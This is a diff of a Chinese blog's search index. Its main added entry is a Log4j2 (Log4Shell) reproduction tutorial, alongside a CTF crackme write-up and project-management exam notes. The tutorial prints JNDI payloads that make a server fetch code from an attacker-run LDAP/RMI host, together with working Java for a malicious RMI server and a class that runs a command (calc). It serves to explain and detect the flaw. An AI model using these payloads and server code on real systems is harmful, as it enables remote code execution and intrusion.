-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>目前已证实服务器易受到漏洞攻击的公司包括苹果、亚马逊、特斯拉、谷歌、百度、腾讯、网易、京东、Twitter、 Steam等。据统计，共有<strong>6921</strong>个应用程序都有被攻击的风险，其中《我的世界》首轮即被波及。就连修改iPhone手机名称都能触发，<font color="red">最主要的是这是国外黑客玩了几个月玩腻了才公开的漏洞！</font></p>
-<p>一个范围广的0day漏洞可能导致整个互联网沦为肉鸡或者瘫痪，网络安全，任重而道远。</p>
-<p>不过早在11月24日，阿里云就监测到了在野攻击并给apache报告了，只是apache新出的版本只是拦截了ldap，其他协议依旧有效。所以公开后很快被腾讯团队测试可绕过，当天发出修复版本Log4j 2.15.0-rc2</p>
-]]></content>
-      <tags>
-        <tag>漏洞复现</tag>
       </tags>
   </entry>
   <entry>
@@ -1195,6 +1151,50 @@ IGMP允许Internet中的计算机参加多播， 是计算机用做向相邻多�
       </tags>
   </entry>
   <entry>
+    <title>log4j 2漏洞原理及复现</title>
+    <url>/2021/12/13/%E6%A0%B8%E5%BC%B9%E7%BA%A7!log4j%202%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>被log4j2漏洞刷频了，公司也是紧急修复了一波，现在来整个盘一下这个漏洞到底是什么原理！测试漏洞的人太多，连dnslog很长一段时间都访问不了，最后还用的ceye测试复现的。</p>
+<div class="tabs" id="influence"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#influence-1">影响版本</button></li><li class="tab"><button type="button" data-href="#influence-2">影响范围</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="influence-1"><p><strong>Apache Log4j 2.x&lt;=2.15.0.rc1</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="influence-2"><p>Spring-Boot-strater-log4j2Apache<br>Struts2Apache<br>SolrApache<br>FlinkApache<br>DruidElasticSearch<br>Flume<br>Dubbo<br>Redis<br>Logstash<br>Kafka<br>vmvare</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div>
+<h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>最主要的漏洞成因就是下面这张图了，log4j2提供的lookup功能</p>
+<p><img src="https://s2.loli.net/2021/12/13/7C3zoiVgf1Tjq2B.jpg" alt="log4j2.jpg"></p>
+<p>日志中包含 <code>$&#123;&#125;</code>,lookup功能就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身。log4j 2将基本的解析都做了实现：<br><div class="tabs" id="lookup"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#lookup-1">实例</button></li><li class="tab"><button type="button" data-href="#lookup-2">支持类型</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="lookup-1"><p>比如常见的用户登陆日志记录</p>
+<p><img src="https://s2.loli.net/2021/12/13/FbTqPux3Ydn9SzE.png" alt="lookup.png"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="lookup-2"><blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;ctx:loginId&#125;</span><br><span class="line">$&#123;map:type&#125;</span><br><span class="line">$&#123;filename&#125;</span><br><span class="line">$&#123;date:MM-dd-yyyy&#125;</span><br><span class="line">$&#123;docker:containerId&#125;$&#123;docker:containerName&#125;</span><br><span class="line">$&#123;docker:imageName&#125;</span><br><span class="line">$&#123;env:USER&#125;</span><br><span class="line">$&#123;event:Marker&#125;</span><br><span class="line">$&#123;mdc:UserId&#125;</span><br><span class="line">$&#123;java&#125;</span><br><span class="line">$&#123;jndi:logging/context-name&#125;</span><br><span class="line">$&#123;hostName&#125;</span><br><span class="line">$&#123;docker:containerId&#125;</span><br><span class="line">$&#123;k8s&#125;</span><br><span class="line">$&#123;log4j&#125;</span><br><span class="line">$&#123;main&#125;</span><br><span class="line">$&#123;name&#125;</span><br><span class="line">$&#123;marker&#125;</span><br><span class="line">$&#123;spring&#125;</span><br><span class="line">$&#123;sys:logPath&#125;</span><br><span class="line">$&#123;web:rootDir&#125;</span><br></pre></td></tr></table></figure>
+</blockquote><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div></p>
+<p>而其中的JNDI（Java Naming and Directory Interface）就是本次的主题了，就是提供一个目录系统，并将服务与对象关联起来，可以使用名称来访问对象。而log4j 2中JNDI解析未作限制，可以直接访问到远程对象，如果是自己的服务器还好说，那如果访问到黑客的服务器呢？</p>
+<p>也就是当记录日志的一部分是用户可控时，就可以构造恶意字符串使服务器记录日志时调用JNDI访问恶意对象，也就是流传出的payload构成：</p>
+<p>${jndi:ldap:xxx.xxx.xxx.xxx:xxxx/exp}</p>
+<p>我们可以将上面日志记录的代码简单修改一下，假设用户名是从外部获取的用户输入，此时构建一个恶意用户名<code>$&#123;jndi:ladp://z2xcu7.dnslog.cn/exp&#125;</code>，然后触发日志记录(可以借助DNSLog生成临时域名用于查看测试是否生效）</p>
+<p><img src="https://s2.loli.net/2021/12/14/DqpwP4NmOai1YQj.png" alt="ldap.png"></p>
+<p>可以看到，记录日志时发起了JNDI解析，访问了DNS提供的域名并生成记录</p>
+<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>其实JNDI通过SPI（Service Provider Interface）封装了多个协议，包括LDAP、RMI、DNS、NIS、NDS、RMI、CORBA；</p>
+<p>复现选择了使用RMI服务，搭建较为快速</p>
+<p>攻击思路（文章中使用的jdk1.8）：</p>
+<h3 id="找到目标服务器记录日志的地方，且记录的部分内容可控"><a href="#找到目标服务器记录日志的地方，且记录的部分内容可控" class="headerlink" title="找到目标服务器记录日志的地方，且记录的部分内容可控"></a>找到目标服务器记录日志的地方，且记录的部分内容可控</h3><p>我们还是选择之前的模拟日志记录，假设站点会记录用户登陆日志，实际上大部分网站确实会做相关功能</p>
+<h3 id="搭建RMI服务端，包含需要执行的恶意代码"><a href="#搭建RMI服务端，包含需要执行的恶意代码" class="headerlink" title="搭建RMI服务端，包含需要执行的恶意代码"></a>搭建RMI服务端，包含需要执行的恶意代码</h3><p>RMI服务端搭建，监听本地8888（自定义）端口，用Reference类引用恶意对象</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">8888</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Create RMI registry on port 8888&quot;</span>);</span><br><span class="line">        Reference reference = <span class="keyword">new</span> Reference(<span class="string">&quot;server.Log4jRCE&quot;</span>, <span class="string">&quot;server.Log4jRCE&quot;</span>, <span class="keyword">null</span>);</span><br><span class="line">        ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">        registry.bind(<span class="string">&quot;exp&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>恶意对象模拟执行cmd打开计算器，并且输出一个语句用于标记执行处</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Log4jRCE</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;exec in here&quot;</span>);</span><br><span class="line">            String [] cmd=&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line">            java.lang.Runtime.getRuntime().exec(cmd).waitFor();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>执行RMIServer，创建RMI服务</p>
+<h3 id="构建EXP触发目标服务器进行日志记录触发JNDI解析"><a href="#构建EXP触发目标服务器进行日志记录触发JNDI解析" class="headerlink" title="构建EXP触发目标服务器进行日志记录触发JNDI解析"></a>构建EXP触发目标服务器进行日志记录触发JNDI解析</h3><p>构建恶意用户名模拟输入，执行触发恶意解析</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">log4j</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(log4j.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String username = <span class="string">&quot;$&#123;jndi:rmi://yourip:8888/exp&#125;&quot;</span>;</span><br><span class="line">        logger.error(username + <span class="string">&quot;is login on $&#123;java:os&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码"><a href="#解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码" class="headerlink" title="解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码"></a>解析结果定位到搭建的恶意服务端，目标服务器访问并触发恶意代码</h3><p>恶意代码被执行，注意看恶意代码执行记录，是在日志记录的地方被执行</p>
+<p><img src="https://s2.loli.net/2021/12/14/RBLCYQ1laAiXvpD.png" alt="res.png"></p>
+<h3 id="其他信息"><a href="#其他信息" class="headerlink" title="其他信息"></a>其他信息</h3><p>看看大佬们都干了啥</p>
+<p><a href="https://m.weibo.cn/status/4713921489404877?wm=3333_2001&amp;from=10BC193010&amp;sourcetype=weixin">特斯拉测试</a><br><a href="https://mp.weixin.qq.com/s/tIv68iiGcXg-Fl4MQY0SGQ">主要利用模式</a></p>
+<h1 id="修复与检测"><a href="#修复与检测" class="headerlink" title="修复与检测"></a>修复与检测</h1><p>可以通过<code>$&#123;jndi</code>字串匹配是否受到攻击</p>
+<p>修复参考链接：</p>
+<p><a href="https://mp.weixin.qq.com/s/mb708YuskTyek29g-3pAEg">https://mp.weixin.qq.com/s/mb708YuskTyek29g-3pAEg</a></p>
+<p><a href="https://mp.weixin.qq.com/s/ClNpWamMn55BkholbUbo_g">https://mp.weixin.qq.com/s/ClNpWamMn55BkholbUbo_g</a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>目前已证实服务器易受到漏洞攻击的公司包括苹果、亚马逊、特斯拉、谷歌、百度、腾讯、网易、京东、Twitter、 Steam等。据统计，共有<strong>6921</strong>个应用程序都有被攻击的风险，其中《我的世界》首轮即被波及。就连修改iPhone手机名称都能触发，<font color="red">最主要的是这是国外黑客玩了几个月玩腻了才公开的漏洞！</font></p>
+<p>一个范围广的0day漏洞可能导致整个互联网沦为肉鸡或者瘫痪，网络安全，任重而道远。</p>
+<p>不过早在11月24日，阿里云就监测到了在野攻击并给apache报告了，只是apache新出的版本只是拦截了ldap，其他协议依旧有效。所以公开后很快被腾讯团队测试可绕过，当天发出修复版本Log4j 2.15.0-rc2</p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>案例分析基本介绍</title>
     <url>/2022/03/22/%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90%E4%BB%8B%E7%BB%8D/</url>
     <content><![CDATA[<h3 id="题型"><a href="#题型" class="headerlink" title="题型"></a>题型</h3><p>主要为<code>问答(找错、改错、提升、基础默写)、计算（成本+进度）25分；还可能有填空、判断、连线、选择（对一个得一分，多选不得分，务必选满）等</code></p>
@@ -1277,35 +1277,6 @@ IGMP允许Internet中的计算机参加多播， 是计算机用做向相邻多�
       </categories>
       <tags>
         <tag>Textual Criticism</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>身在何处wp</title>
-    <url>/2021/11/15/%E8%BA%AB%E5%9C%A8%E4%BD%95%E5%A4%84wp/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>题目来自于<a href="https://ctf.pediy.com/game-team_list-15-21.htm">看雪CTF (pediy.com)</a></p>
-<p>原题下载链接：<a href="https://pan.lanzoui.com/ip5mnwj2nlc?w">kctf2021.rar - 蓝奏云 (lanzoui.com)</a></p>
-<h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><p>通过字符串Success!直接定位到关键函数</p>
-<blockquote>
-<p>关键点在于第二次f_generate生成的字符串要与0x1388C77相等</p>
-<p>f_generate生成值与传入的参数有关，相同参数返回相同结果</p>
-<p><img src="https://i.loli.net/2021/11/15/aBHn3JOLhvTYldA.png" alt="func.png"></p>
-</blockquote>
-<p>f_generate分成两个部分</p>
-<blockquote>
-<p>第一部分与参数无关，通过循环加异或生成一个固定字符串0x2D02EF80</p>
-<p>再与传入的字符串参数作用生成j，最后取~j作为返回值</p>
-<p><img src="https://i.loli.net/2021/11/15/zbsx4K9vTf8VkBW.png" alt="func2.png"></p>
-</blockquote>
-<h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><p>因为最后只要将序列号和由用户名生成的随机数进行异或，得到的值再传入f_generate能生成0x13B88C77即可，所以直接获取题目中包含的用户名和序列号，得到第二次传入的值0x52A1ED5A</p>
-<p><img src="https://i.loli.net/2021/11/15/xiA51tBo9U2dKTW.png" alt="number.png"></p>
-<p>即需满足：0x5EE54F4C ^ serial = 0x52A1ED5A<br>serial = 0x5EE54F4C^0x52A1ED5A=’205824534’ (转成10进制字符串)</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>kctf2021</category>
-      </categories>
-      <tags>
-        <tag>kctf2021</tag>
       </tags>
   </entry>
   <entry>
@@ -1421,7 +1392,14 @@ IGMP允许Internet中的计算机参加多播， 是计算机用做向相邻多�
 
 </li>
 </ol>
-<h4 id="规划成本"><a href="#规划成本" class="headerlink" title="规划成本"></a>规划成本</h4>]]></content>
+<h4 id="规划成本"><a href="#规划成本" class="headerlink" title="规划成本"></a>规划成本</h4><p>规划成本管理是为规划、管理、花费和控制项目成本而制定政策、程序和文档的过程。本过程的主要作用是， 在整个项目中为如何管理项目成本提供指南和方向。</p>
+<h5 id="规划成本：输入"><a href="#规划成本：输入" class="headerlink" title="规划成本：输入"></a>规划成本：输入</h5><ul>
+<li>项目管理计划。</li>
+<li>项目章程。</li>
+<li>事业环境因素。</li>
+<li>组织过程资产。</li>
+</ul>
+]]></content>
       <categories>
         <category>软考</category>
       </categories>
@@ -1430,139 +1408,33 @@ IGMP允许Internet中的计算机参加多播， 是计算机用做向相邻多�
       </tags>
   </entry>
   <entry>
-    <title>项目立项管理</title>
-    <url>/2022/03/30/%E9%A1%B9%E7%9B%AE%E7%AB%8B%E9%A1%B9%E7%AE%A1%E7%90%86/</url>
-    <content><![CDATA[<h3 id="立项管理内容"><a href="#立项管理内容" class="headerlink" title="立项管理内容"></a>立项管理内容</h3><p>&emsp;&emsp;项目立项一般包括提交<strong>项目建议书、项目可行性研究、项目招标与投标</strong>等内容。</p>
-<h4 id="项目建议书"><a href="#项目建议书" class="headerlink" title="项目建议书"></a>项目建议书</h4><p>&emsp;&emsp;<font color="red">项目建议书（又称立项申请）是<strong>项目建设单位</strong>向<strong>上级主管部门</strong>提交项目申请时所必须的文件，是对拟建项目提出的框架性的总体设想。在项目建议书批准后， 方可开展对外工作。</font></p>
-<font color="red">(选择题)项目建议书应该包括的核心内容如下:</font>
-
-<ol>
-<li><font color="red">项目的必要性。</font></li>
-<li><font color="red">项目的市场预测。</font></li>
-<li><font color="red">产品方案或服务的市场预测。</font></li>
-<li><font color="red">项目建设必需的条件。</font>
-
-</li>
-</ol>
-<h4 id="项目可行性研究报告"><a href="#项目可行性研究报告" class="headerlink" title="项目可行性研究报告"></a>项目可行性研究报告</h4><p>&emsp;&emsp;可行性研究具有预见性、公正性、可靠性、科学性的特点。</p>
-<font color="red">可行性研究内容一般包含如下内容：</font>
-
-<ol>
-<li><font color="red">投资必要性</font></li>
-<li><font color="red">技术的可行性</font></li>
-<li><font color="red">财务可行性</font></li>
-<li><font color="red">组织可行性</font></li>
-<li><font color="red">经济可行性</font></li>
-<li><font color="red">社会可行性</font></li>
-<li><font color="red">风险因素及对策</font>
-
-</li>
-</ol>
-<h4 id="项目招投标"><a href="#项目招投标" class="headerlink" title="项目招投标"></a>项目招投标</h4><p>（会有专门的课程讲法规）</p>
-<p>&emsp;&emsp;为防止投标人在投标后撤标或在中标后拒不签订合同，招标人通常都要求投标人提供—定比例或金额的投标保证金。招标人决定中标人后，未中标的投标人已缴纳的保证金即予退还。</p>
-<p>&emsp;&emsp;如果以邮寄方式送达的，投标人必须留出邮寄时间，保证投标文件能够在截止日期之前送达招标人指定的地点，而不是以 “ 邮戳为准＂。在截止时间后送达的投标文件，即已经过了招标有效期的，招标人应当原封退回，不得进入开标阶段。</p>
-<h3 id="可行性研究"><a href="#可行性研究" class="headerlink" title="可行性研究"></a>可行性研究</h3><h4 id="可行性研究的内容"><a href="#可行性研究的内容" class="headerlink" title="可行性研究的内容"></a>可行性研究的内容</h4><h5 id="技术可行性分析"><a href="#技术可行性分析" class="headerlink" title="技术可行性分析"></a>技术可行性分析</h5><font color="red">技术可行性分析—般应当考虑以下因素。</font>
-
-<ol>
-<li><font color="red">进行项目开发的风险。在给定的限制范围和时间期限内，能否设计出预期的系统并实现必须的功能和性能。</font></li>
-<li><font color="red">人力资源的有效性。可以用于项目开发的**技术人员**队伍是否可以建立， 是否存在人力资源不足、技术能力欠缺等问题， 是否可以在市场上或者通过培训获得所需要的**熟练技术人员**。</font></li>
-<li><font color="red">技术能力的可能性。相关技术的发展趋势和当前所掌握的技术是否支持该项目的开发， 市场上是否存在支持该技术的开发环境、平台和工具。</font></li>
-<li><font color="red">物资（产品）的可用性。是否存在可以用于建立系统的其他资源，如—些设备以及可行的替代产品等。</font>
-
-</li>
-</ol>
-<h5 id="经济可行性分析"><a href="#经济可行性分析" class="headerlink" title="经济可行性分析"></a>经济可行性分析</h5><font color="red">经济可行性分析具体包括支出分析、收益分析、投资回报分析以及敏感性分析等：</font>
-
-<ol>
-<li><font color="red">支出分析：信息系统项目的支出可以分为一次性支出和非一次性支出两类。</font></li>
-<li><font color="red">收益分析： 信息系统项目的收益包括直接收益、间接收益以及其他方面的收益等。</font></li>
-<li><font color="red">收益投资比、投资回收期分析： 对投入产出进行对比分析， 以确定项目的收益率和投资回收期等经济指标。（之后会学计算题）</font></li>
-<li><font color="red">敏感性分析：当诸如设备和软件配置、处理速度要求、系统的工作负荷类型和负荷量等关键性因素变化时，对支出和收益产生影响的估计。</font>
-
-</li>
-</ol>
-<p>&emsp;&emsp;除了上述的经济方面的分析外，一般还需要对项目的社会效益进行分析。例如，通过项目的实施，可以在管理水平、技术手段、人员素质等方面获得潜在的效益。</p>
-<h5 id="运行环境可行性分析"><a href="#运行环境可行性分析" class="headerlink" title="运行环境可行性分析"></a>运行环境可行性分析</h5><p>&emsp;&emsp;运行环境是制约信息系统在用户单位发挥效益的关键。因此，需要从用户单位（企业）的管理体制、管理方法、规章制度、工作习惯、人员素质（甚至包括人员的心理承受能力、接受新知识和技能的积极性等）、数据资源积累、硬件（包含系统软件）平台等多方面进行评估， 以确定软件系统在交付以后， 是否能够在用户单位顺利运行。</p>
-<h5 id="其他方面的可行性分析"><a href="#其他方面的可行性分析" class="headerlink" title="其他方面的可行性分析"></a>其他方面的可行性分析</h5><p>&emsp;&emsp;信息系统项目的可行性研究除了前面介绍的技术、经济和运行环境可行性分析外，还包括了诸如<strong>法律可行性、社会可行性</strong>等方面的可行性分析。</p>
-<h4 id="可行性研究的步骤"><a href="#可行性研究的步骤" class="headerlink" title="可行性研究的步骤"></a>可行性研究的步骤</h4><p>&emsp;&emsp;<font color="red">—般地，可行性研究分为初步可行性研究、详细可行性研究、可行性研究报告三个基本的阶段</font></p>
-<p>&emsp;&emsp;（不要求会）可行性研究可以归纳成几个基本步骤：</p>
-<pre><code>(1)确定项目规模和目标。
-(2)研究正在运行的系统。
-(3)建立新系统的逻辑模型。
-(4)导出和评价各种方案。
-(5)推荐可行性方案。
-(6)编写可行性研究报告。
-(7)递交可行性研究报告。
-</code></pre><h4 id="初步可行性研究"><a href="#初步可行性研究" class="headerlink" title="初步可行性研究"></a>初步可行性研究</h4><h5 id="初步可行性研究的定义及目的"><a href="#初步可行性研究的定义及目的" class="headerlink" title="初步可行性研究的定义及目的"></a>初步可行性研究的定义及目的</h5><p>&emsp;&emsp;初步可行性研究—般是在对市场或者客户情况进行调查后， 对项目进行的初步评估。</p>
-<p>&emsp;&emsp;详细可行性研究需要对项目在技术、经济、社会、运行环境、法律等方面进行深入的调查研究和分析， 是一项费时、费力的工作， 特别是大型的或比较复杂的项目更是如此。</p>
-<p>&emsp;&emsp;进行初步可行性评估， 可以从几个方面进行衡量， 以便决定是否开始详细可行性研究：</p>
-<pre><code>(1)分析项目的前途，从而决定是否应该继续深入调查研究。
-(2)初步估计和确定项目中的关键技术及核心问题，以确定是否需要解决。
-(3)初步估计必须进行的辅助研究， 以解决项目的核心间题， 并判断是否具备必要的技术、实验、人力条件作为支持。
-</code></pre><p>&emsp;&emsp;<font color="red">经过初步可行性研究， 可以形成<strong>初步可行性研究报告</strong></font></p>
-<h5 id="初步可行性研究的结果及作用"><a href="#初步可行性研究的结果及作用" class="headerlink" title="初步可行性研究的结果及作用"></a>初步可行性研究的结果及作用</h5><p>&emsp;&emsp;<font color="red">初步项目可行性研究的内容与详细的项目可行性研究基本相同，</font>要包括以下内容：市场情况、信息系统设计开发能力、配件、网络物理布局、技术和设备选择、网络安装工程、企业管理费、人力资源、项目实施及经济评价。</p>
-<p>&emsp;&emsp;<font color="red">在初步项目可行性研究之前可进行项目机会研究， 如果就投资可能性已进行了项目机会研究， 那么项目的初步可行性研究阶段往往可以省去。</font></p>
-<h5 id="辅助（功能）研究"><a href="#辅助（功能）研究" class="headerlink" title="辅助（功能）研究"></a>辅助（功能）研究</h5><p>&emsp;&emsp;<font color="red">辅助（功能）研究包括项目的一个或几个方面， 但不是所有方面</font></p>
-<h4 id="详细可行性研究"><a href="#详细可行性研究" class="headerlink" title="详细可行性研究"></a>详细可行性研究</h4><p>&emsp;&emsp;<strong>机会研究、 初步可行性研究、 详细可行性研究、 评估与决策</strong>是投资前时期的四个阶段。 在实际工作中， 前三个阶段依项目的规模和繁简程度可把前两个阶段省略或合二为—，但详细可行性研究是不可缺少的。 升级改造项目只做初步和详细研究， 小项目一般只进行详细可行性研究。</p>
-<h5 id="详细可行性研究的原则与程序框架"><a href="#详细可行性研究的原则与程序框架" class="headerlink" title="详细可行性研究的原则与程序框架"></a>详细可行性研究的原则与程序框架</h5><p>&emsp;&emsp;（可以不看）详细可行性研究的基本原则：</p>
-<pre><code>(1)科学性原则。
-(2)客观性原则。
-(3)公正性原则。
-</code></pre><h5 id="详细可行性研究的方法"><a href="#详细可行性研究的方法" class="headerlink" title="详细可行性研究的方法"></a>详细可行性研究的方法</h5><p>&emsp;&emsp;（可以不看，只需了解是详细可行性研究的方法即可）可行性研究的方法很多， 如经济评价法、市场预测法、投资估算法和增量净效益法等。</p>
-<p>&emsp;&emsp;增量净效益法(有无比较法)：将有项目时的成本（效益）与无项目时的成本（效益）进行比较， 求得两者差额，即为增量成本（效益）， 这种方法称之为有无比较法。</p>
-<h5 id="详细可行性研究的内容"><a href="#详细可行性研究的内容" class="headerlink" title="详细可行性研究的内容"></a>详细可行性研究的内容</h5><font color="red">信息系统项目详细可行性研究的内容，一般可以归纳如下（常给出几点考缺少哪点，大概率是缺钱相关的）：</font>
-
-<ol>
-<li><font color="red">概述</font>：提出项目开发的背景、必要性和经济意义， 研究项目工作的依据和范围，产品交付的形式、种类、数量。</li>
-<li><font color="red">需求确定</font>： 调查研究国内外客户的需求情况， 对国内外的技术趋势进行分析，确定项目的规模、目标、产品、方案和发展方向。</li>
-<li><font color="red">现有资源、设施情况分析</font>： 调查现有的资源（包括硬件设备、软件系统、数据、规章制度等种类与数量， 以及这些资源的使用情况和可能的更新情况）。</li>
-<li><font color="red">设计（初步）技术方案</font>： 确定项目的总体和详细目标、范围， 总体的结构和组成， 核心技术和关键问题、产品的功能与性能。</li>
-<li><font color="red">项目实施进度计划建议</font>。</li>
-<li><font color="red"><strong>投资估算和资金筹措计划</strong></font>。</li>
-<li><font color="red">项目组织、人力资源、技术培训计划</font>： 包括现有的人员规模、组织结构、人员层次、个人技术能力、人员技术培训计划等。</li>
-<li><font color="red"><strong>经济和社会效益分析（效果评价）</strong></font>。</li>
-<li><font color="red">合作／协作方式</font>。</li>
-</ol>
-<h4 id="效益的预测与评估"><a href="#效益的预测与评估" class="headerlink" title="效益的预测与评估"></a>效益的预测与评估</h4><p>&emsp;&emsp;对于效益的量化及计算方法有函数求解法、相关关系法、模糊数学法、专家意见法（德尔菲法）、成本降低法、利润增加发</p>
-<h3 id="项目评估与论证"><a href="#项目评估与论证" class="headerlink" title="项目评估与论证"></a>项目评估与论证</h3><h4 id="项目论证"><a href="#项目论证" class="headerlink" title="项目论证"></a>项目论证</h4><h5 id="项目论证的概念"><a href="#项目论证的概念" class="headerlink" title="项目论证的概念"></a>项目论证的概念</h5><p>&emsp;&emsp;项目论证是指对拟实施项目技术上的先进性、适用性， 经济上的合理性、盈利性， 实施上的可能性、风险性进行全面科学的综合分析， 为项目决策提供客观依据的一种技术经济研究活动。</p>
-<h5 id="项目论证的作用"><a href="#项目论证的作用" class="headerlink" title="项目论证的作用"></a>项目论证的作用</h5><font color="red">项目前评价的作用主要体现在以下几个方面：</font>
-
-<ol>
-<li><font color="red">项目论证是确定项目是否实施的依据。</font></li>
-<li><font color="red">项目论证是筹措资金、向银行贷款的依据。</font></li>
-<li><font color="red">项目论证是编制计划、设计、采购、施工以及机构设备、资源配置的依据。</font></li>
-<li><font color="red">项目论证是防范风险、提高项目效率的重要保证。</font>
-
-</li>
-</ol>
-<h5 id="项目论证的阶段划分"><a href="#项目论证的阶段划分" class="headerlink" title="项目论证的阶段划分"></a>项目论证的阶段划分</h5><p>项目论证一般分为机会研究、初步可行性研究和详细可行性研究三个阶段。</p>
-<p><img src="https://s2.loli.net/2022/03/30/D6B7XKoJabm8OHy.png" alt="image-20220330143617293"></p>
-<h5 id="项目论证的一般程序"><a href="#项目论证的一般程序" class="headerlink" title="项目论证的一般程序"></a>项目论证的一般程序</h5><p>（只考过一次，可以不看，看的话提取关键字记住顺序）项目论证的一般程序，一般有以下七个主要步骤：</p>
-<pre><code>(1) 明确项目范围和业主目标。
-(2) 收集并分析相关资料。
-(3) 拟定多种可行的能够相互替代的实施方案。
-(4) 多方案分析、比较。
-(5) 选择最优方案进一步详细全面地论证
-(6) 编制项目论证报告、环境影响报告书和采购方式审批报告。
-(7) 编制资金筹措计划和项目实施进度计划。
-</code></pre><h5 id="项目评估"><a href="#项目评估" class="headerlink" title="项目评估"></a>项目评估</h5><h5 id="项目评估的含义及其依据"><a href="#项目评估的含义及其依据" class="headerlink" title="项目评估的含义及其依据"></a>项目评估的含义及其依据</h5><p>&emsp;&emsp;项目评估指在项目可行性研究的基础上， 由<font color="red">第三方（国家、银行或有关机构）</font>根据国家颁布的政策、 法规、 方法、 参数和条例等， 从项目（或企业）、国民经济、社会角度出发，对拟建项目建设的必要性、建设条件、生产条件、产品市场需求、工程技术、经济效益和社会效益等进行评价、 分析和论证，进而判断其是否可行的一个评估过程。项目评估是项目投资前期进行决策管理的重要环节，<font color="red">其目的是审查项目可行性研究的可靠性真实性和客观性，为银行的贷款决策或行政主管部门的审批决策提供科学依据。</font></p>
-<font color="red">项目评估的最终成果是项目评估报告。</font>
-
-<p>&emsp;&emsp;项目评估的依据包括如下项目:</p>
-<pre><code>项目建议书及其批准文件。
-项目可行性研究报告。
-报送单位的申请报告及主管部门的初审意见。
-有关资源、配件、燃料、水、电、交通、通信、资金（包括外汇）等方面的协议文件。
-必需的其他文件和资料。
-</code></pre><h3 id="补充考点："><a href="#补充考点：" class="headerlink" title="补充考点："></a>补充考点：</h3><ol>
